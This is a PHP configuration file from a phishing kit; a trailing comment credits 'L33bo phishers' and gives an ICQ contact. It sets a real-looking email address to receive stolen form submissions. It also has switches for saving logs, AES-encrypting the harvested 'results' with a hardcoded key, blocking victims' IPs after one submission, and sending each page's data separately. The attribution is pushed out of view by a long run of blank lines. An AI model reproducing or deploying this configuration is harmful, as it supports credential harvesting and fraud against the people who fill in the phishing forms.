<?php @error_reporting(0);

/*
****** Set your email below and configure functions to your requirments ****

*/
$Your_Email = "biasjamar@gmail.com";  // Set your email
$Send_Log=1;  // 
$Save_Log=1;  // 
$Abuse_Filter=0; // Block absuive text 
$One_Time_Access=0; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending multiple fake forms
$Encrypt=0; // Encrypt: This will send/save your results with aes to decrypt use the key below
$Key = 	"232BBCD7D47A1192"; // This key is used to decrypt results and can be changed
$Send_Per_Page=1; // Send each pages data seperate
?>

































































<?php /*L33bo phishers = ICQ: 695059760*/ ?>